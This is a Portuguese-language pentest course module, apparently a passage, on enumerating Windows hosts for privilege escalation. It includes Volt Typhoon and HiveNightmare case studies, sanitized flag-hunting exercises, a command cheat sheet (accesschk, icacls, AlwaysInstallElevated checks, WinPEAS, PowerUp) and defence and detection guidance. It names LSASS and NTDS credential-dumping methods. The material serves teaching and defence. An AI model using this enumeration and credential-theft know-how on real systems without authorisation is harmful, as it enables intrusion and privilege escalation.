+Em **7 de fevereiro de 2024**, a CISA, a NSA e o FBI (com parceiros internacionais) publicaram o aviso conjunto **AA24-038A** sobre o grupo estatal chinês **Volt Typhoon**, que se pré-posicionava em infraestrutura crítica dos EUA (comunicações, energia, água, transporte) mantendo acesso por, em alguns casos, **cinco anos**. A marca registrada do grupo era o <GlossaryTerm term="living off the land">living off the land</GlossaryTerm>: quase toda a enumeração do host era feita com **binários nativos do Windows**, para se misturar à atividade normal e evadir o EDR.
+
+O aviso lista as ferramentas que eles usavam para o reconhecimento — e é, convenientemente, quase a mesma lista deste módulo: `systeminfo`, `tasklist /v`, `net user`/`net group`/`net use`, `whoami`, `wmic`, `reg query` e `reg save`, `netstat`, `nltest`, `ping` e PowerShell (inclusive `Get-EventLog security -instanceid 4624` para ler logons). Para credenciais, usavam o `vssadmin` para criar uma <GlossaryTerm term="volume shadow copy">volume shadow copy</GlossaryTerm> e o `ntdsutil` para extrair a base do domínio, e o `comsvcs.dll` com `MiniDump` para despejar o <GlossaryTerm term="LSASS">LSASS</GlossaryTerm>.
+
+- **Impacto:** acesso persistente e furtivo a redes de infraestrutura crítica, com o objetivo de pré-posicionamento para sabotagem num eventual conflito.
+- **Lição:** a enumeração por living off the land não é teoria de laboratório — é a primeira coisa que um adversário sério faz, justamente porque os binários nativos não acendem alarme. A lista de comandos que você aprende aqui é a mesma que um defensor deve aprender a **detectar** quando parte de uma conta de serviço.
+- **Fonte:** [CISA AA24-038A — PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a).
+
+### HiveNightmare / SeriousSAM — quando a enumeração de permissões passou a gritar (CVE-2021-36934, 2021)
+
+No 6.5 você vai **explorar** o HiveNightmare; aqui vale vê-lo pela lente da **enumeração**, porque ele mostra como um achado inócuo vira vetor. Em julho de 2021 (CVE atribuída em **22/07/2021**), descobriu-se que, no Windows 10 (1809+) e no Windows 11, o <GlossaryTerm term="DACL">DACL</GlossaryTerm> dos arquivos de hive `SAM`, `SYSTEM` e `SECURITY` em `%windir%\System32\config` ficara **permissivo demais**: o grupo de usuários comuns tinha direito de leitura. Um simples `icacls C:\Windows\System32\config\SAM` — enumeração de permissões pura — já revelava a falha, sem nenhum exploit.
+
+- **Impacto:** <GlossaryTerm term="local privilege escalation">escalação local</GlossaryTerm> de qualquer usuário a SYSTEM (lendo os hashes das contas locais por uma <GlossaryTerm term="volume shadow copy">volume shadow copy</GlossaryTerm>); CVSS 3.1 de **7.8 (High)**. A Microsoft corrigiu em agosto de 2021, e a CVE entrou no catálogo **KEV** (vulnerabilidades exploradas conhecidas) da CISA em **10 de fevereiro de 2022**.
+- **Lição:** permissão de arquivo é a superfície de enumeração mais fácil de ignorar e uma das que mais rendem. O achado parecia rotina ("um `icacls` num arquivo de sistema"), e era um caminho confiável a SYSTEM. Como no PwnKit do 6.2, **a enumeração não muda, mas o que ela significa muda** — por isso você coleta tudo, até o que parece inócuo.
+- **Fonte:** [CVE-2021-36934 — Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934).
+
+## 5. Mãos à obra — enumerar e triar
+
+Este módulo **não tem lab próprio**: o alvo é o Windows, e a habilidade central não é apertar um botão de exploit — é **ler uma saída de enumeração e decidir qual achado é o vetor real**. Você vai treinar isso de duas formas: (1) três missões de análise, contra um cenário que você gera no seu WSL, cada uma terminando numa flag; e (2) um reconhecimento guiado no **seu próprio Windows** (a máquina é sua — ético), para ver os comandos reais com os seus próprios olhos.
+
+**Objetivo:** ao terminar, você terá (1) lido um dump do WinPEAS e achado o único achado que é vetor de verdade; (2) cruzado `sc` e `icacls` para achar o único serviço explorável entre chamarizes; e (3) priorizado, entre dois caminhos, qual entregar ao 6.5 primeiro. Três flags, uma por missão. Cada flag está escondida em **base64** (que você viu na Trilha 3) na saída do achado certo; decodificar a do achado errado devolve um `decoy:`, não a flag.
+
+### 5.1 Preparar o terreno (passo a passo)
+
+Abra o terminal do Ubuntu (WSL) e cole o bloco inteiro de uma vez. Ele cria, em `/tmp/privesc-win-enum`, as saídas de enumeração sanitizadas de um host Windows comprometido com acesso de baixo privilégio:
+
+```bash
+ROOT=/tmp/privesc-win-enum
+rm -rf "$ROOT"; mkdir -p "$ROOT"
+cd "$ROOT"
+
+# --- Missão 1: um trecho de WinPEAS (cores mostradas como [RED]/[YELLOW]/[GREEN]) ---
+cat > m1-winpeas.txt <<'EOF'
+WinPEAS output — host SRV-APP01 — collected as webapp
+Legend (printed by the tool): RED/YELLOW = ~95% a PE vector; GREEN = common things.
+
+[GREEN] Current user groups:
+        BUILTIN\Users, Everyone, NT AUTHORITY\Authenticated Users
+        ; note(base64)=ZGVjb3k6IGdyZWVuIGlzIGEgY29tbW9uIHRoaW5nIGluIHdpbnBlYXMsIG5vdCBhIHZlY3Rvcg==
+
+[RED]   Token privileges of the current process:
+        SeChangeNotifyPrivilege (Enabled) — bypass traverse checking
+        ; note(base64)=ZGVjb3k6IHRoaXMgcmVkIGxpbmUgb25seSBkZXNjcmliZXMgeW91ciBvd24gdG9rZW4=
+
+[YELLOW] Modifiable Services (you can reconfigure or overwrite):
+        SyncHost  (runs as LocalSystem)  <-- you have write access
+        ; note(base64)=RkxBR3t3aW5wZWFzLXJlZC15ZWxsb3ctZmlyc3R9
+EOF
+
+# --- Missão 2: cruzar sc (conta) + icacls (gravável?) ---
+cat > m2-sc.txt <<'EOF'
+sc qc of four services — host SRV-APP01
+SyncHost    BINARY_PATH_NAME: C:\Apps\SyncHost\synchost.exe        SERVICE_START_NAME: LocalSystem
+UserAgent   BINARY_PATH_NAME: C:\Users\webapp\agent\uagent.exe     SERVICE_START_NAME: .\webapp
+AuditSvc    BINARY_PATH_NAME: C:\Apps\Audit\audit.exe              SERVICE_START_NAME: LocalSystem
+HealthSvc   BINARY_PATH_NAME: "C:\Program Files\Health Mon\hm.exe" SERVICE_START_NAME: LocalSystem
+EOF
+
+cat > m2-icacls.txt <<'EOF'
+icacls of each service binary — host SRV-APP01
+C:\Apps\SyncHost\synchost.exe        BUILTIN\Users:(M)            NT AUTHORITY\SYSTEM:(F)
+        ; note(base64)=RkxBR3t3cml0YWJsZS1iaW5hcnktbWVldHMtbG9jYWxzeXN0ZW19
+C:\Users\webapp\agent\uagent.exe     SRV-APP01\webapp:(F)        NT AUTHORITY\SYSTEM:(F)
+        ; note(base64)=ZGVjb3k6IGJpbmFyeSBpcyB3cml0YWJsZSBidXQgc2VydmljZSBydW5zIGFzIHlvdXIgb3duIHVzZXI=
+C:\Apps\Audit\audit.exe              BUILTIN\Users:(RX)          NT AUTHORITY\SYSTEM:(F)
+        ; note(base64)=ZGVjb3k6IHlvdSBjYW4gcmVhZCB0aGlzIGNvbmZpZyBidXQgbm90IGNoYW5nZSBpdA==
+C:\Program Files\Health Mon\hm.exe   BUILTIN\Users:(RX)          NT AUTHORITY\SYSTEM:(F)
+        ; note(base64)=ZGVjb3k6IHBhdGggaXMgcXVvdGVkLCBub3RoaW5nIHRvIGhpamFjayBoZXJl
+EOF
+
+# --- Missão 3: triar/priorizar dois vetores vivos ---
+cat > m3-triage.txt <<'EOF'
+whoami /priv and WES-NG summary — host SRV-APP01 — webapp
+
+whoami /priv:
+        SeImpersonatePrivilege  Enabled   Impersonate a client after authentication
+        ; vector A note(base64)=RkxBR3tzZWltcGVyc29uYXRlLWZpcnN0LWtlcm5lbC1sYXN0fQ==
+
+WES-NG (systeminfo cross-referenced with the KB database):
+        [E] CVE-2023-21768 afd.sys Elevation of Privilege — kernel exploit candidate
+        ; vector C note(base64)=ZGVjb3k6IGEga2VybmVsIGV4cGxvaXQgaXMgdGhlIGxvdWQgbGFzdCByZXNvcnQ=
+EOF
+
+echo "Cenário pronto em $ROOT"; ls -1 "$ROOT"
+```
+
+Para decodificar uma nota, isole o valor depois de `base64=` e passe para o `base64 -d`:
+
+```console
+$ grep 'note(base64)' m1-winpeas.txt | head -1 | sed 's/.*base64)=//' | base64 -d; echo
+```
+
+### 5.2 Missão 1 — Ler o WinPEAS e achar o vetor real (guiada)
+
+Você rodou o WinPEAS e ele cuspiu três achados coloridos (`m1-winpeas.txt`). A tentação do iniciante é olhar só o vermelho. Não caia nela: leia a **legenda** e cada achado. Comece vendo os três:
+
+```console
+$ grep -E '\[(RED|YELLOW|GREEN)\]' m1-winpeas.txt
+[GREEN] Current user groups:
+[RED]   Token privileges of the current process:
+[YELLOW] Modifiable Services (you can reconfigure or overwrite):
+```
+
+O verde é "coisa comum" (seus grupos — contexto, não vetor). O **vermelho** parece promissor, mas leia o que ele diz: é só o `SeChangeNotifyPrivilege` do **seu próprio** token — informativo, todo mundo tem. O **amarelo** aponta um serviço LocalSystem que você pode modificar — esse é o cruzamento controle × poder. Seu objetivo: decodificar a nota do achado que é, de fato, o vetor.
+
+<Hint title="Dica 1">
+RED e YELLOW são ambos "olhe aqui", mas nem todo RED é vetor: este só descreve o seu token. O vetor é o achado que cruza algo que você **controla** (modificar o serviço) com algo que tem **poder** (ele roda como LocalSystem) — o `[YELLOW]`.
+</Hint>
+
+<Hint title="Dica 2">
+Pegue a `note(base64)` do bloco `[YELLOW]` e decodifique. A dos blocos `[GREEN]` e `[RED]` vai começar com `decoy:` e explicar por que não serve.
+</Hint>
+
+<Solution title="Solução">
+O achado `[YELLOW]` (Modifiable Services → `SyncHost`, LocalSystem, com acesso de escrita) é o único vetor: você controla o serviço, e ele roda com poder. Decodifique a nota dele:
+
+```console
+$ awk '/\[YELLOW\]/{f=1} f&&/note/{print;exit}' m1-winpeas.txt | sed 's/.*base64)=//' | base64 -d; echo
+```
+
+A saída é a flag — mande no cartão. (Decodificar o `[GREEN]` dá `decoy: green is a common thing...`; o `[RED]`, `decoy: this red line only describes your own token`.) **Lição:** a cor é um guia, não a resposta. RED/YELLOW é por onde começar, mas você confirma lendo **o que** o achado diz e perguntando se há cruzamento controle × poder.
+</Solution>
+
+<FlagInput task="missao-1-winpeas" />
+
+### 5.3 Missão 2 — Cruzar `sc` e `icacls` (desafio)
+
+Agora a enumeração manual, a que não faz barulho. Você tem a config de quatro serviços (`m2-sc.txt`) e o `icacls` de cada binário (`m2-icacls.txt`). **Só um** é vetor real: aquele cujo binário você pode gravar **e** que roda como LocalSystem. Ache-o e decodifique a nota dele.
+
+<Hint title="Dica 1 — as duas listas">
+Quem executa cada serviço:
+
+```console
+$ cat m2-sc.txt
+```
+
+Quem pode gravar cada binário (procure `(M)` de Modify, não `(RX)` de só leitura):
+
+```console
+$ grep -E 'exe|note' m2-icacls.txt
+```
+
+Qual serviço tem `SERVICE_START_NAME: LocalSystem` **e** `Users:(M)` no binário?
+</Hint>
+
+<Hint title="Dica 2 — elimine os chamarizes">
+- `UserAgent` — você pode gravar o binário, mas ele roda como `.\webapp` (você mesmo) → trocar o binário não te dá poder nenhum.
+- `AuditSvc` e `HealthSvc` — rodam como LocalSystem, mas o `icacls` mostra `Users:(RX)` → você só lê, não grava.
+- Sobra um: LocalSystem **e** `Users:(M)`.
+</Hint>
+
+<Solution title="Solução">
+O vetor é o `SyncHost`: o `m2-sc.txt` mostra `SERVICE_START_NAME: LocalSystem` e o `m2-icacls.txt` mostra `C:\Apps\SyncHost\synchost.exe  BUILTIN\Users:(M)`. É o único cruzamento controle (gravar o binário) × poder (LocalSystem). Decodifique a nota dele:
+
+```console
+$ awk '/synchost.exe/{f=1} f&&/note/{print;exit}' m2-icacls.txt | sed 's/.*base64)=//' | base64 -d; echo
+```
+
+É a flag. (O `UserAgent` decodifica para `decoy: binary is writable but service runs as your own user`; os outros, para avisos de leitura/aspas.) **Lição:** nenhuma das duas saídas, sozinha, é um vetor. "Binário gravável" sem uma conta poderosa é inútil; "serviço LocalSystem" que você não pode tocar também. O vetor nasce do **cruzamento** — e achá-lo é o trabalho da enumeração.
+</Solution>
+
+<FlagInput task="missao-2-cruzamento" />
+
+### 5.4 Missão 3 — Priorizar o que entregar ao 6.5 (desafio)
+
+Enumerar termina em **triagem**. O `m3-triage.txt` descreve um host com dois caminhos: (A) a conta tem `SeImpersonatePrivilege` ligado; (C) o WES-NG sugere um kernel exploit para a build. Os dois "funcionam". Seu objetivo: decidir qual você tentaria **primeiro** — e decodificar a nota dele.
+
+<Hint title="Dica 1">
+Releia a lição do 6.1/6.2 sobre priorização: **confiabilidade, ruído e estabilidade**. Qual dos dois é quase garantido, silencioso e não arrisca derrubar a máquina? Qual é o "martelo" barulhento, guardado para o fim porque pode causar uma tela azul?
+</Hint>
+
+<Solution title="Solução">
+Você tenta **primeiro o vetor A** (`SeImpersonatePrivilege`): via PrintSpoofer (6.5) ele é confiável, silencioso e estável. O kernel exploit do WES-NG (vetor C) é o último recurso — pode travar o host (BSOD) e acende alarmes. Decodifique a nota do vetor A:
+
+```console
+$ grep 'vector A' m3-triage.txt | sed 's/.*base64)=//' | base64 -d; echo
+```
+
+É a flag. (O vetor C decodifica para `decoy: a kernel exploit is the loud last resort`.) **Lição:** enumerar não é só achar vetores — é **ordená-los**. A lista que você entrega ao 6.5 começa pelo bisturi (a má configuração confiável) e deixa o martelo (o kernel exploit) para quando nada mais existir.
+</Solution>
+
+<FlagInput task="missao-3-triagem" />
+
+### 5.5 No seu próprio Windows (sem flag)
+
+Como o WSL roda sobre o seu Windows, você pode ver os comandos de verdade na máquina que é sua. Abra o `cmd` (ou o PowerShell, lembrando do `sc.exe`) e rode — é tudo leitura, nada muda no sistema:
+
+<Solution title="Ver o reconhecimento real na sua máquina">
+```console
+C:\> whoami /priv
+C:\> whoami /groups | findstr /i "Mandatory Label"
+C:\> systeminfo | findstr /B /C:"OS Version" /C:"System Type"
+C:\> sc.exe query type= service state= all | findstr SERVICE_NAME | more
+C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+C:\> cmdkey /list
+```
+
+Compare a sua saída com a das seções 3.1–3.4. Repare no seu `Mandatory Label` (provavelmente `Medium` num terminal comum e `High` num elevado — a marca do UAC do 0.5), e no seu `whoami /priv` (numa conta comum, sem os privilégios de serviço; numa conta de serviço real, com eles). O `AlwaysInstallElevated` quase certamente não existe/retorna erro na sua máquina — e é assim que **deve** ser. Você acabou de fazer, no seu host, a mesma leitura que faria num alvo.
+</Solution>
+
+### 5.6 Limpar
+
+O cenário vive todo em `/tmp` e não tocou no seu sistema:
+
+```console
+$ rm -rf /tmp/privesc-win-enum
+```
+
+## 6. Variações e aprofundamento
+
+- **Grupos que são atalho.** O `whoami /groups` às vezes já entrega o jogo: estar em `BUILTIN\Administrators` (mesmo filtrado pelo UAC) muda tudo — falta só contornar o UAC. Grupos como `Backup Operators` (dá `SeBackupPrivilege` efetivo) ou `Server Operators` são quase-admin. Leia os grupos com a mesma atenção que os privilégios.
+- **"Estou num contêiner/numa sessão restrita?"** Vale perguntar. Um Windows container, uma sessão do WinRM, ou um shell de um pool do IIS com <GlossaryTerm term="AMSI">AMSI</GlossaryTerm> e Constrained Language Mode ligados mudam o que você consegue rodar — e, portanto, como enumera. Descobrir a restrição é parte da enumeração.
+- **Enumeração "às cegas", só com o nativo.** Quando o WinPEAS é barrado, um bom pentester enumera só com `cmd`/PowerShell: um laço sobre os serviços (`for /f` no `sc query`), `reg query` recursivo, `dir /q` para donos. É o mesmo living off the land da transferência — e às vezes o único caminho.
+- **Além do WinPEAS.** Há outros enumeradores com ênfases diferentes — o **Seatbelt** (contexto de host, em C#), o **PowerUp** (má config de serviço, em PowerShell), o **JAWS** e o **PrivescCheck**. Conhecer dois ou três evita depender de um só, e cada um tem um perfil de ruído diferente.
+- **Enumeração contínua.** Como no Linux, enumerar não é um evento único. Virou outro usuário, pulou para outro host? **Enumere de novo** — o token é outro, as permissões são outras. O funil roda a cada degrau.
+
+## 7. Erros comuns
+
+- **`sc` em vez de `sc.exe` no PowerShell.** No PowerShell, `sc` é alias de `Set-Content` — o comando cria um arquivo chamado `query` em vez de consultar o serviço (você viu no 0.5). Use `sc.exe`, com a extensão, ou `Get-Service`.
+- **`reg query` sem o `/v`.** Sem especificar o valor, você lista a chave inteira e pode não ver o `AlwaysInstallElevated`. Use `/v AlwaysInstallElevated` para ir direto — e confira **as duas** chaves (HKLM e HKCU).
+- **Confundir `QUERY_CONFIG` com `CHANGE_CONFIG`.** No `accesschk`, ler a config de um serviço (`SERVICE_QUERY_CONFIG`) não é poder mudá-la. Só `SERVICE_CHANGE_CONFIG` (ou `SERVICE_ALL_ACCESS`) é vetor.
+- **Olhar só o vermelho do WinPEAS.** `RED/YELLOW` é o começo, não o fim. Metade dos vetores está no cruzamento de duas seções (um binário gravável numa, um serviço LocalSystem noutra) que nenhuma cor conecta por você.
+- **Rodar o WinPEAS e ser pego pelo Defender/AMSI.** Num alvo com defesa, a ferramenta pode ser bloqueada antes de terminar — e você acha que "não achou nada", quando na verdade nem rodou. Confirme que a ferramenta executou, ou volte ao nativo.
+- **Ignorar o nível de patch.** Pular o `systeminfo` e a lista de hotfixes deixa a classe "software vulnerável" inteira sem enumerar. O WES-NG só é útil com essa saída na mão.
+
+## 8. Defesa e mitigação
+
+A enumeração é barata para o atacante porque o Windows revela muito por desenho. A defesa trabalha em duas frentes: **reduzir o que a máquina conta** e **detectar quem está perguntando**.
+
+**Reduzir o que a enumeração revela:**
+
+- **Privilégio mínimo das contas de serviço.** Não rode serviços como <GlossaryTerm term="LocalSystem">LocalSystem</GlossaryTerm> por hábito. Use contas virtuais (`NT SERVICE\<serviço>`) ou gMSA (group Managed Service Accounts), com só os direitos de que o serviço precisa. Um serviço subvertido que não é LocalSystem não vira SYSTEM — e um `whoami /priv` sem `SeImpersonatePrivilege` não entrega o achado de maior prioridade.
+- **Aperte os DACLs de serviço e os binários.** Usuários comuns não devem ter `SERVICE_CHANGE_CONFIG` nem escrita nos binários de serviço. Audite com o **próprio accesschk** (`accesschk.exe -uwcqv "Authenticated Users" *`) — a ferramenta do ataque, virada para a defesa — e com o PowerUp num exercício interno. Garanta aspas em todo `ImagePath` com espaço.
+- **Desligue o `AlwaysInstallElevated`** por <GlossaryTerm term="Group Policy">Group Policy</GlossaryTerm> (as duas chaves em `0`); quase nunca há motivo legítimo para ligá-lo.
+- **Tire os segredos dos lugares legíveis.** Nada de senha em `unattend.xml`, `web.config` ou no `cmdkey`. Use um cofre e <GlossaryTerm term="LAPS">LAPS</GlossaryTerm> (para que a senha do administrador local seja única por máquina — se um host cai, o hash local não abre os outros).
+- **Mantenha o patch em dia.** É o que cega o WES-NG: sem hotfix faltando, a classe "software vulnerável" fica vazia.
+
+**Detectar a enumeração:**
+
+- **Bloqueie e registre as ferramentas.** O <GlossaryTerm term="Microsoft Defender Antivirus">Microsoft Defender</GlossaryTerm> e o <GlossaryTerm term="AMSI">AMSI</GlossaryTerm> pegam WinPEAS/PowerUp/Seatbelt conhecidos; o **PowerShell Script Block Logging** registra o que um script tentou fazer mesmo quando ele roda. Ligue os dois.
+- **Vigie os binários nativos em contexto suspeito.** O difícil é o living off the land: `sc`, `reg`, `whoami` são legítimos. Mas um `whoami /priv` seguido de `systeminfo` e `net group` **partindo da conta de um pool do IIS** é o padrão de Discovery (MITRE ATT&CK T1082 *System Information Discovery*, T1033 *Owner/User Discovery*, T1057 *Process Discovery*). O <GlossaryTerm term="Sysmon">Sysmon</GlossaryTerm> (evento 1, criação de processo) e um EDR com regras de Discovery pegam essa sequência — foi assim que a atividade da Volt Typhoon foi caracterizada.
+- **Audite o que a enumeração procura.** Alertas para leitura dos hives (`SAM`/`SYSTEM`), para a criação de uma volume shadow copy por uma conta não-administrativa, e para mudança de config de serviço (<GlossaryTerm term="event ID">event ID</GlossaryTerm> 7045/4697) fecham os caminhos que a enumeração abre.
+
+<Callout variant="info" title="A mesma assimetria, agora a favor do defensor">
+O atacante precisa que **uma** config vaze para achar o vetor. O defensor que roda contas de serviço sem privilégio, aperta os DACLs, desliga o AlwaysInstallElevated, mantém o patch e liga o Script Block Logging + Sysmon obriga o atacante a enumerar no escuro — e deixa rastro quando ele tenta. Não existe "esconder tudo", mas cada superfície fechada é um degrau a menos e um alarme a mais.
+</Callout>
+
+## 9. Exercícios
+
+As três flags da seção 5 são a parte prática: Missão 1 (ler o WinPEAS), Missão 2 (cruzar `sc` e `icacls`) e Missão 3 (priorizar o vetor). Faça-as no seu WSL. Depois, responda ao quiz — ele cobra o *porquê* de cada decisão de enumeração, não a decoreba dos comandos.
+
+<Quiz task="quiz-final" />
+
+### Cenários para pensar (sem flag)
+
+1. **Você enumerou um alvo Windows: o `whoami /priv` não tem nenhum privilégio de serviço, os serviços graváveis rodam todos como a sua própria conta, e o `systeminfo` mostra a máquina totalmente atualizada.** Antes de concluir "não dá para escalar", quais superfícies você ainda não olhou? Liste pelo menos três (dica: releia o funil da seção 2.4) e diga qual comando cobre cada uma.
+
+2. **Num engajamento com cláusula de "não ser detectado", você decide entre jogar o WinPEAS ou enumerar à mão.** Quais fatores pesam? Por que o AMSI e o Defender mudam essa conta no Windows mais do que no Linux? Onde o Seatbelt se encaixa nesse meio-termo?
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Enumerar no Windows é ler o que a máquina revela por desenho — a config dos serviços, o token, as permissões, as políticas — e separar o achado que importa do ruído. Vem **antes** de explorar (que é o 6.5).
+- Três superfícies: **serviços** (`sc`, `accesschk`), **privilégios do token** (`whoami /priv`) e **permissões de arquivo/registro** (`icacls`, `reg query`). Um achado só vira vetor no **cruzamento** controle × poder (6.1).
+- No Windows, o **nível de patch** (`systeminfo` + hotfixes, cruzado pelo **WES-NG**) pesa muito; e a identidade é o **token**, não o uid.
+- As ferramentas aceleram — **WinPEAS** (varre e colore, `RED/YELLOW` primeiro), **PowerUp** (má config de serviço), **Seatbelt** (contexto) — mas são artefatos que o **Defender/AMSI** pegam; os binários nativos (`sc`/`reg`/`icacls`) são living off the land e silenciosos.
+- A triagem usa as quatro classes do 6.1 e prioriza por confiabilidade, ruído e estabilidade: primeiro o confiável e discreto (`SeImpersonate`, binário gravável), o kernel exploit por último.
+- A defesa é quase toda **configuração** (conta de serviço sem privilégio, DACLs firmes, AlwaysInstallElevated desligado, patch em dia) + **detecção** (Script Block Logging, Sysmon, regras de Discovery).
+
+### Cola rápida
+
+```text
+# contexto e patch
+whoami ; whoami /groups ; systeminfo ; systeminfo | findstr /C:"KB"
+# token (o achado mais valioso costuma estar aqui)
+whoami /priv                              # procure SeImpersonate/SeBackup/SeDebug
+# serviços
+sc.exe qc <servico>                       # binário + conta
+accesschk.exe -uwcqv <usuario> * -accepteula   # serviços que você pode mudar
+icacls C:\caminho\do\binario.exe          # (M) de Users = gravável
+# permissões/registro
+reg query HKLM\...\Installer /v AlwaysInstallElevated   # e a de HKCU
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+schtasks /query /fo LIST /v ; cmdkey /list
+# automatizado (laboratório) / sugeridor de exploit
+winPEASx64.exe ; . .\PowerUp.ps1; Invoke-AllChecks
+wes.py systeminfo.txt                     # na sua máquina, com o systeminfo do alvo
+```
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [PEASS-ng (LinPEAS e WinPEAS)](https://github.com/peass-ng/PEASS-ng) — o projeto dos enumeradores, com a legenda de cores.
+- [Seatbelt (GhostPack)](https://github.com/GhostPack/Seatbelt) — o enumerador de host em C#.
+- [PowerUp / PowerSploit](https://github.com/PowerShellMafia/PowerSploit) — o `Invoke-AllChecks` de má configuração de serviço.
+- [Windows Exploit Suggester – Next Generation (WES-NG)](https://github.com/bitsadmin/wesng) — cruza o `systeminfo` com a base de CVEs.
+- [CISA AA24-038A — Volt Typhoon](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a) — o aviso com a lista real de comandos de enumeração living-off-the-land.
+- [HackTricks — Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) — a checklist de enumeração mais completa da área.
